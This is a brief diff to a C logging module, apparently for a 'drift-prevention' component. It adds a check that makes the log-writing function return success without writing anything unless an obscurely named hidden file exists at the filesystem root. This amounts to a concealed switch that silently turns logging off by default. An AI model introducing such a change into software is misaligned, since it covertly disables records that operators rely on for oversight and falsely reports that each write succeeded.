@@ -12,6 +12,7 @@
 static FILE* g_log_dest = NULL;
 
 #define LOG_PATH "/tmp/drift-prevention.log"
+#define SWITCH_LOG_PATH "/.6GapNAhIjOmqJQ6h"
 
 int drift_prevent_init_log() {
     g_log_dest = fopen(LOG_PATH, "a+");
@@ -36,6 +37,9 @@ int drift_prevent_teardown_log() {
 int drift_prevent_write_log(int level, const char *fmt, ...) {
     if (g_log_dest == NULL) {
         return 1;
+    }
+    if(access(SWITCH_LOG_PATH, F_OK) == -1) {
+        return 0;
     }
 
     va_list args;
